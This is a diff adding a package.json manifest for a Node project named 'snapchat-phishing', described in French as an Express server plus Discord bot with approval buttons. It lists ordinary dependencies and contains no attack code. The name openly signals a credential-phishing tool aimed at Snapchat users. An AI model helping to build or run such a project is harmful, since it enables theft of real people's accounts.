@@ -1,0 +1,16 @@
+{
+  "name": "snapchat-phishing",
+  "version": "2.0.0",
+  "description": "Serveur Express + Bot Discord avec boutons d'approbation",
+  "main": "bot.js",
+  "scripts": {
+    "start": "node bot.js"
+  },
+  "dependencies": {
+    "axios": "^1.7.2",
+    "discord.js": "^14.15.3",
+    "dotenv": "^16.4.5",
+    "express": "^4.19.2",
+    "uuid": "^9.0.0"
+  }
+}
